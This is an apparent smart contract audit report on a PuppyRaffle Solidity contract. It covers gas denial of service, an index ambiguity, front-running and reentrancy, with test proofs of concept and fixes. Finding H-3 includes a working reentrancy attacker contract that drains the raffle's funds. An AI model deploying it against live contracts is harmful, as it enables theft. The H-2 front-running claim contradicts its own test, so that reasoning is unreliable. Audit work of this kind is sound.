### [H-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```solidity
// @audit DoS Attack
@> for (uint256 i = 0; i < players.length - 1; i++) {
@>     for (uint256 j = i + 1; j < players.length; j++) {
@>         require(players[i] != players[j], "PuppyRaffle: Duplicate player");
@>     }
@> }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6,540,000 gas
- 2nd 100 players: ~18,940,000 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place into following test into `PuppyRaffle.t.sol`

```Javascript
    function testDenialOfService() public {
        vm.txGasPrice(1);
        uint256 playerNum = 100;
        address[] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(uint160(i));
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players:", gasUsedFirst);

        //second 100players
        address[] memory playersTwo = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            playersTwo[i] = address(uint160(i + playerNum));
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

</details>

**Recommended Mitigation:** There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
     .
     .
     .
     function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        // rest of function
    }
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

---

### [M-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players, causing confusion with actual index 0 (**`slither, aderyn can't detect`**)

**Description:** The `getActivePlayerIndex` function returns 0 when a player is not found in the players array. However, 0 is also a valid array index for the first player. This creates ambiguity where callers cannot distinguish between "player not found" and "player is at index 0".

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;  // Valid index
        }
    }
    return 0;  // @audit Problem: Same value as valid index 0
}
```

**Impact:**

- Functions or external contracts relying on this function may incorrectly treat non-existent players as being at index 0
- This could lead to incorrect logic in player management or raffle operations
- Potential for unintended behavior in integrations that use this function

**Proof of Concept:**

```solidity
// Scenario: players = [0xAlice, 0xBob, 0xCharlie]
uint256 aliceIndex = puppyRaffle.getActivePlayerIndex(0xAlice);    // Returns 0 (correct)
uint256 eveIndex = puppyRaffle.getActivePlayerIndex(0xEve);        // Returns 0 (incorrect - Eve doesn't exist)
// Both return 0, but have completely different meanings
```

**Recommended Mitigation:** Consider one of the following approaches:

1. **Revert on not found:**

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}
```

2. **Return boolean + index:**

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

3. **Add separate existence check:**

```solidity
function isActivePlayer(address player) external view returns (bool) {
    return _isActivePlayer(player);
}

function getActivePlayerIndex(address player) external view returns (uint256) {
    require(_isActivePlayer(player), "PuppyRaffle: Player not active");
    // existing loop logic
}
```

---

### [H-2] MEV vulnerability in `PuppyRaffle::refund` allows front-running attacks through observable playerIndex parameter (**`slither, aderyn can't detect`**)

**Description:** The `refund` function accepts a `playerIndex` parameter that is observable in the mempool before transaction execution. This creates an MEV (Maximum Extractable Value) opportunity where MEV bots can front-run legitimate refund transactions by copying the `playerIndex` value and attempting to claim the refund for themselves.

```solidity
function refund(uint256 playerIndex) public {
    // @audit MEV vulnerability - playerIndex is observable in mempool
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**

- MEV bots can monitor the mempool for refund transactions and attempt to front-run them
- Legitimate users may experience failed transactions due to front-running attempts
- Network congestion and increased gas costs due to MEV competition
- Poor user experience with unpredictable transaction success rates
- Economic exploitation of users through MEV extraction

**Attack Scenario:**

1. **User submits refund**: Alice calls `refund(5)` with gas price 20 gwei
2. **MEV bot detection**: Bot observes the transaction in mempool and sees `playerIndex = 5`
3. **Front-running attempt**: Bot submits `refund(5)` with higher gas price (25 gwei)
4. **Transaction ordering**: Bot's transaction executes first due to higher gas price
5. **User transaction fails**: Alice's transaction reverts with "Only the player can refund" since `players[5] != Alice` anymore

**Proof of Concept:**

```solidity
function testMEVFrontRunning() public {
    address[] memory players = new address[](2);
    players[0] = playerOne;
    players[1] = playerTwo;
    puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    
    address attacker = address(0x1337);
    
    // Simulate MEV bot observing playerIndex = 0 in mempool
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    
    // Attacker attempts to front-run with higher gas price
    vm.prank(attacker);
    vm.expectRevert("PuppyRaffle: Only the player can refund");
    puppyRaffle.refund(playerIndex);
    
    // Original user transaction would still succeed in this case
    // but demonstrates the observable nature of playerIndex
}
```

**Recommended Mitigation:** Remove the `playerIndex` parameter and derive it internally:

```solidity
function refund() public {
    uint256 playerIndex = _getPlayerIndex(msg.sender);
    require(playerIndex != type(uint256).max, "PuppyRaffle: Player not found");
    
    address playerAddress = players[playerIndex];
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}

function _getPlayerIndex(address player) internal view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Not found
}
```

This mitigation:
- Eliminates observable parameters from the transaction
- Prevents MEV bots from extracting the player index from mempool observation
- Maintains the same functionality while removing the front-running vulnerability
- Uses `type(uint256).max` as a clear "not found" indicator instead of 0

---

### [H-3] Reentrancy vulnerability in `PuppyRaffle::refund` allows attackers to drain the contract (**`slither detects, but not well documented`**)

**Description:** The `refund` function violates the CEI (Checks-Effects-Interactions) pattern by making an external call (`sendValue`) before updating the contract state (`players[playerIndex] = address(0)`). This allows an attacker to re-enter the function and drain all funds from the contract.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    // @audit reentrancy - external call before state update
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0); // ← State update happens AFTER external call
    emit RaffleRefunded(playerAddress);
}
```

**Impact:**

- Complete drainage of the contract's funds
- Financial loss for all legitimate participants
- Potential loss of NFT prizes as the contract becomes insolvent
- Reputational damage to the protocol

**Attack Scenario:**

1. **Setup**: Attacker deploys a malicious contract and enters the raffle
2. **Initial refund**: Attacker calls `refund()` to trigger the attack
3. **Reentrancy**: When `sendValue()` executes, it triggers the attacker's `receive()` function
4. **State exploitation**: `players[attackerIndex]` is still valid, allowing another `refund()` call
5. **Recursive drain**: Attack continues until contract balance is insufficient
6. **Complete theft**: Attacker steals entrance fees from all participants

**Proof of Concept:**

```solidity
contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }
}

function testReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
    console.log("starting puppy raffle balance:", startingPuppyRaffleBalance);
    
    // Execute reentrancy attack
    attackerContract.attack{value: entranceFee}();
    
    uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
    console.log("ending puppy raffle balance:", endingPuppyRaffleBalance);
    
    // Contract should be drained
    assert(endingPuppyRaffleBalance < startingPuppyRaffleBalance);
}
```

**Recommended Mitigation:** Follow the CEI pattern by updating state before external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Effects: Update state first
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    
    // Interactions: External call last
    payable(msg.sender).sendValue(entranceFee);
}
```

**Alternative mitigation** using OpenZeppelin's ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        // existing logic
    }
}
```

This vulnerability demonstrates why the CEI pattern is fundamental to secure smart contract development and why external calls should always be treated with extreme caution.
